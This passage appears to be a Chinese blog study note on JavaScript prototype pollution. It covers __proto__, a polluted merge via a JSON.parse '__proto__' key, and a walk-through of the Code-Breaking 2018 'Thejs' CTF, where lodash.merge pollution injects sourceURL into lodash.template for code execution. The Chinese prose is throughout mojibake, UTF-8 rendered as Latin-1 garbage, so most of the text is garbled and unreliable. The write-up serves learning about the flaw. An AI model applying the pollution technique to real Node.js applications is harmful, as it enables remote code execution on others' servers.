ç»“æ„ï¼‰çš„è¿‡ç¨‹ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š åˆ›å»ºä¸€ä¸ªç©ºçš„ JSON ç»“æ„ ä»¥è¿™ä¸ªæ–°çš„ JSON ç»“æ„ä¸º thisï¼Œè¿è¡Œç±»çš„æ„é€ å™¨constructor åœ¨ç¨‹åºå†…éƒ¨å°†è¿™ä¸ª JSON ç»“æ„çš„åŸå‹æŒ‡å‘æ„é€ å™¨çš„prototype è¿”å›è¿™ä¸ªæ–°çš„ JSON ç»“æ„ å®ä¾‹çš„å±æ€§ç”±constructorå‡½æ•°å¯¹thisæ·»åŠ å±æ€§è€Œç›´æ¥æ·»åŠ äºå®ä¾‹ï¼ˆæ–°çš„ JSON ç»“æ„ï¼‰ä¹‹ä¸‹ï¼Œå±æ€§æ˜¯è¿™ä¸ªå®ä¾‹ç‹¬æœ‰çš„ï¼Œç”±ç›¸åŒæ„é€ å™¨åˆ›å»ºçš„å…¶å®ƒå®ä¾‹å…·æœ‰å®ƒä»¬ç‹¬æœ‰çš„å±æ€§ï¼Œäº’ä¸å½±å“ å®ä¾‹çš„æ–¹æ³•ç»§æ‰¿è‡ªæ„é€ å™¨çš„prototypeï¼Œæ”¹å˜æ„é€ å™¨ä¸­çš„prototypeçš„å†…å®¹å°†å½±å“åˆ°æ‰€æœ‰ç”±è¿™ä¸ªæ„é€ å™¨åˆ›å»ºçš„å®ä¾‹ å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªå®ä¾‹çš„constructorå±æ€§æ—¶ï¼ŒJavaScript å¹¶æ²¡æœ‰åœ¨è¿™ä¸ªå®ä¾‹çš„ JSON ç»“æ„ä¸­æ‰¾åˆ°å¯¹åº”çš„å±æ€§ï¼Œè½¬è€Œå‘å®ƒçš„åŸå‹ï¼ˆæ„é€ å™¨çš„prototypeï¼‰å¯»æ‰¾ï¼Œå¹¶æ‰¾åˆ°äº†constructorå±æ€§ï¼Œç„¶åè¿”å›å®ƒçš„å€¼ å½“æˆ‘ä»¬è®¿é—®è¿™ä¸ªå®ä¾‹çš„__proto__å±æ€§æ—¶ï¼ŒJavaScript å¹¶æ²¡æœ‰åœ¨è¿™ä¸ªå®ä¾‹çš„çš„ JSON ç»“æ„ä¸­æ‰¾åˆ°å¯¹åº”çš„å±æ€§ï¼Œè½¬è€Œå‘å®ƒçš„åŸå‹ï¼ˆæ„é€ å™¨çš„prototypeï¼‰å¯»æ‰¾ï¼Œåœ¨å®ƒçš„åŸå‹ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œè½¬è€Œç»§ç»­å‘å®ƒçš„åŸå‹çš„åŸå‹ï¼ˆObject.prototypeï¼‰å¯»æ‰¾ï¼Œå¹¶æ‰¾åˆ°äº†prototypeå±æ€§ï¼Œå¹¶è¿”å›å®ƒçš„å€¼ï¼Œç”±äºå®ƒæ˜¯ä¸€ä¸ª Getterï¼Œæ‰€ä»¥ JavaScript ä»¥æ‰€è®¿é—®çš„å®ä¾‹ä¸º this è¿”å›äº†è¿™ä¸ª Getter å‡½æ•°çš„è¿”å›å€¼ æˆ‘ä»¬è®¿é—®å®ä¾‹çš„constructorå’Œ__proto__å±æ€§çš„è¿‡ç¨‹åæ˜ äº† JavaScript ä¸­çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼šåŸå‹ 3.7 åŸå‹é“¾æ±¡æŸ“ åŸå‹é“¾æŒ‡çš„æ˜¯ç”±å¤šä¸ª__proto__è¿åœ¨ä¸€èµ·è€Œå½¢æˆçš„é“¾å¼åŸå‹è®¿é—®ï¼Œå¦‚calc.__proto__.__proto__ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå¯¹è±¡ï¼ˆJSON ç»“æ„ï¼‰çš„__proto__æ‰€æŒ‡å‘çš„åœ°å€ä¸å¯¹è±¡åŸå‹çš„åœ°å€æ˜¯ä¸€è‡´çš„ ç”± JavaScript çš„åŸå‹é“¾æŸ¥æ‰¾å»ºç«‹èµ·æ¥çš„ç§©åºä½¿å¾—æ„é€ å™¨å’Œå®ä¾‹å¤„äºä¸€ç§ç¨³å®šçš„å…³ç³»ä¹‹ä¸­ï¼Œè™½ç„¶æˆ‘ä»¬é€šè¿‡Object.defineProperty(obj, '__proto__', { value })çš„æ–¹å¼æ”¹å˜ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§å¹¶ä¸èƒ½æ”¹å˜è¿™ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œä½†æ˜¯æˆ‘ä»¬å´èƒ½å¤Ÿé€šè¿‡__proto__è®¿é—®åˆ°å®ƒçš„åŸå‹ å¦‚æœæˆ‘ä»¬å¯¹å®ƒçš„åŸå‹è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼Œå°±èƒ½è¾¾åˆ°æ”¹å˜ç¨‹åºé€»è¾‘çš„ç›®çš„ï¼Œä»è€Œè§¦å‘ä¸€äº›æ¼æ´ï¼Œè¿™ç§äººä¸ºé€šè¿‡åŸå‹é“¾ä¿®æ”¹åŸå‹çš„è¡Œä¸ºæˆä¸ºåŸå‹é“¾æ±¡æŸ“ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ‰‹æ®µ å¯¹äºå¤§å¤šæ•°é JavaScript é¢„å®šä¹‰çš„å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡__proto__æˆ–è€…constructor.prototypeè®¿é—®å®ƒçš„åŸå‹ï¼Œå¯¹å®ƒåŸå‹ä¸‹çš„å±æ€§è¿›è¡Œä¿®æ”¹å¯ä»¥é€ æˆåŸå‹é“¾æ±¡æŸ“ emmmæ€»çš„æ¥è¯´ï¼Œä»£ç åŸºç¡€æœ‰ç‚¹å·®ï¼Œä»2.5ä¹‹åçœ‹çš„å°±æœ‰ç‚¹å›°éš¾äº†ï¼Œå› æ­¤æˆ‘å†ç»“åˆpç¥çš„çœ‹ä¸€éå§ã€‚ã€‚ã€‚ã€‚ 0x04 æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» 4.1 prototypeå’Œ__proto__åˆ†åˆ«æ˜¯ä»€ä¹ˆ JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥å®šä¹‰â€œæ„é€ å‡½æ•°â€çš„æ–¹å¼æ¥å®šä¹‰ï¼š function Foo() { this.bar = 1 } new Foo() Fooå‡½æ•°çš„å†…å®¹ï¼Œå°±æ˜¯Fooç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œthis.barå°±æ˜¯Fooç±»çš„ä¸€ä¸ªå±æ€§ã€‚ ä¸ºäº†ç®€åŒ–ç¼–å†™JavaScriptä»£ç ï¼ŒECMAScript 6åå¢åŠ äº†classè¯­æ³•ï¼Œä½†classå…¶å®åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ã€‚ ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§this.barï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new Foo()).show() ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œthis.show = function...å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸ªshowæ–¹æ³•å®é™…ä¸Šæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸­ã€‚ æˆ‘å¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼Œè¿™æ—¶å€™å°±åˆ™éœ€è¦ä½¿ç”¨åŸå‹ï¼ˆprototypeï¼‰äº†ï¼š function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„fooå¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰foo.show()æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥__proto__ç™»åœºäº†ã€‚ ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡foo.__proto__å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š foo.__proto__ == Foo.prototype æ‰€ä»¥ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š prototypeæ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³• ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„prototypeå±æ€§ 4.2 JavaScriptåŸå‹é“¾ç»§æ‰¿ æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚ æ¯”å¦‚ï¼š function Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) Sonç±»ç»§æ‰¿äº†Fatherç±»çš„last_nameå±æ€§ï¼Œæœ€åè¾“å‡ºçš„æ˜¯Name: Melania Trumpã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨son.last_nameçš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.__proto__ä¸­å¯»æ‰¾last_name å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.__proto__.__proto__ä¸­å¯»æ‰¾last_name ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°nullç»“æŸã€‚æ¯”å¦‚ï¼ŒObject.prototypeçš„__proto__å°±æ˜¯null JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚ ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype) å¯¹è±¡çš„__proto__å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶ 4.3 åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ ç¬¬ä¸€ç« ä¸­è¯´åˆ°ï¼Œfoo.__proto__æŒ‡å‘çš„æ˜¯Fooç±»çš„prototypeã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†foo.__proto__ä¸­çš„å€¼ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¿®æ”¹Fooç±»å‘¢ï¼Ÿ åšä¸ªç®€å•çš„å®éªŒï¼š // fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡ let foo = {bar: 1} // foo.bar æ­¤æ—¶ä¸º1 console.log(foo.bar) // ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰ foo.__proto__.bar = 2 // ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1 console.log(foo.bar) // æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡ let zoo = {} // æŸ¥çœ‹zoo.bar console.log(zoo.bar) æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ªç©ºå¯¹è±¡{}ï¼Œä½†zoo.barçš„ç»“æœå±…ç„¶æ˜¯2ï¼š åŸå› ä¹Ÿæ˜¾è€Œæ˜“è§ï¼šå› ä¸ºå‰é¢æˆ‘ä»¬ä¿®æ”¹äº†fooçš„åŸå‹foo.__proto__.bar = 2ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚ åæ¥ï¼Œæˆ‘ä»¬åˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡let zoo = {}ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚ é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚ 4.4 å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾åˆ°èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š å¯¹è±¡mergeâ€“åˆå¹¶ å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰ ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œtarget[key] = source[key]ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯__proto__ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ æˆ‘ä»¬ç”¨å¦‚ä¸‹ä»£ç å®éªŒä¸€ä¸‹ï¼š let o1 = {} let o2 = {a: 1, \"__proto__\": {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) ç»“æœæ˜¯ï¼Œåˆå¹¶è™½ç„¶æˆåŠŸäº†ï¼Œä½†åŸå‹é“¾æ²¡æœ‰è¢«æ±¡æŸ“ï¼š è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆlet o2 = {a: 1, \"__proto__\": {b: 2}}ï¼‰ä¸­ï¼Œ__proto__å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯[a, b]ï¼Œ__proto__å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚ é‚£ä¹ˆï¼Œå¦‚ä½•è®©__proto__è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿ æˆ‘ä»¬å°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š let o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) å¯è§ï¼Œæ–°å»ºçš„o3å¯¹è±¡ï¼Œä¹Ÿå­˜åœ¨bå±æ€§ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“ï¼š è¿™æ˜¯å› ä¸ºï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚ mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚ 4.5 Code-Breaking 2018 Thejs åˆ†æ ä¸‹é¢æ˜¯pç¥å‡ºçš„é¢˜ç›®ï¼Œè¿™é‡Œæˆ‘ä¹Ÿåªæ˜¯æ¸…æ¥šäº†æ¼æ´åˆ©ç”¨ç‚¹ï¼Œè‡³äºpayloadæš‚æ—¶ä¸ç†è§£ã€‚ã€‚ã€‚ æˆ‘åœ¨Code-Breaking 2018ä¸­å‡ºäº†ä¸€é“åŸå‹é“¾æ±¡æŸ“çš„CTFé¢˜ç›®ï¼Œä¸ºäº†æ›´åŠ è´´åˆçœŸå®ç¯å¢ƒï¼Œæˆ‘æ²¡æœ‰åˆ»æ„åŠ å¤ªå¤šè‡ªå·±çš„ä»£ç ï¼Œåç«¯ä¸»è¦ä»£ç å¦‚ä¸‹ï¼ˆå®Œæ•´ä»£ç å¯å‚è€ƒè¿™é‡Œï¼‰ï¼š // ... const lodash = require('lodash') // ... app.engine('ejs', function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all('/', (req, res) =&gt; { let data = req.session.data || {language: [], category: []} if (req.method == 'POST') { data = lodash.merge(data, req.body) req.session.data = data } res.render('index', { language: data.language, category: data.category }) }) lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š lodash.template ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“ lodash.merge å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶ å…¶å®æ•´ä¸ªåº”ç”¨é€»è¾‘å¾ˆç®€å•ï¼Œç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜ä½ æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚ è€Œè¿™é‡Œçš„lodash.mergeæ“ä½œå®é™…ä¸Šå°±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ åœ¨æ±¡æŸ“åŸå‹é“¾åï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥ç»™Objectå¯¹è±¡æ’å…¥ä»»æ„å±æ€§ï¼Œè¿™ä¸ªæ’å…¥çš„å±æ€§ååº”åœ¨æœ€åçš„lodash.templateä¸­ã€‚æˆ‘ä»¬çœ‹åˆ°lodash.templateçš„ä»£ç ï¼šhttps://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 // Use a sourceURL for easier debugging. var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + ' ' : ''; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues); }); optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLå–åˆ°äº†å…¶options.sourceURLå±æ€§ã€‚è¿™ä¸ªå±æ€§åŸæœ¬æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œé»˜è®¤å–ç©ºå­—ç¬¦ä¸²ã€‚ ä½†å› ä¸ºåŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥ç»™æ‰€æœ‰Objectå¯¹è±¡ä¸­éƒ½æ’å…¥ä¸€ä¸ªsourceURLå±æ€§ã€‚æœ€åï¼Œè¿™ä¸ªsourceURLè¢«æ‹¼æ¥è¿›new Functionçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æˆ‘å°†å¸¦æœ‰__proto__çš„Payloadä»¥jsonçš„å½¢å¼å‘é€ç»™åç«¯ï¼Œå› ä¸ºexpressæ¡†æ¶æ”¯æŒæ ¹æ®Content-Typeæ¥è§£æè¯·æ±‚Bodyï¼Œè¿™é‡Œç»™æˆ‘ä»¬æ³¨å…¥åŸå‹æä¾›äº†å¾ˆå¤§æ–¹ä¾¿ï¼š å¯è§ï¼Œæˆ‘ä»¬ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œè¿”å›äº†idå‘½ä»¤çš„ç»“æœã€‚ 4.6 Tips æ–‡ç« å†…å…³äºåŸå‹å’ŒåŸå‹é“¾çš„çŸ¥è¯†å†™çš„éå¸¸è¯¦ç»†ï¼Œå°±ä¸å†æ€»ç»“æ•´ä¸ªè¿‡ç¨‹äº†ï¼Œä»¥ä¸‹ä¸ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼š åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚ ä¾‹å­ï¼š object.prototype.name=value åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª__proto__å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š objectname[\"__proto__\"] objectname.__proto__ objectname.constructor.prototype ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š var o = {a: 1}; // oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype // åŸå‹é“¾ï¼š // o ---&gt; Object.prototype ---&gt; null var a = [\"yo\", \"whadup\", \"?\"]; // æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype // åŸå‹é“¾ï¼š // a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null function f(){ return 2; } // å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype // åŸå‹é“¾ï¼š // f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null 0x05 è¿›ä¸€æ­¥ç†è§£-ç®€åŒ–ç‰ˆ 5.1 åŸå‹é“¾æ±¡æŸ“åŸç† å¯¹äºè¯­å¥ï¼šobject[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º__proto__ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚ æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š object1 = {\"a\":1, \"b\":2}; object1.__proto__.foo = \"Hello World\"; console.log(object1.foo); object2 = {\"c\":1, \"d\":2}; console.log(object2.foo); â€‹ æœ€ç»ˆä¼šè¾“å‡ºä¸¤ä¸ªHello Worldã€‚ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº†ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚ 5.2 Code-Breaking 2018 Thejs è¿™å›å†è·Ÿç€å…ˆçŸ¥ç¤¾åŒºçš„ä½¬è¿‡ä¸€é é¢˜ç›®æºç ä¸‹è½½ï¼šhttp://code-breaking.com/puzzle/9/ ç›´æ¥npm installå¯ä»¥æŠŠéœ€è¦çš„æ¨¡å—ä¸‹è½½ä¸‹æ¥ã€‚ server.js const fs = require('fs') const express = require('express') const bodyParser = require('body-parser') const lodash = require('lodash') const session = require('express-session') const randomize = require('randomatic') const app = express() app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) app.use('/static', 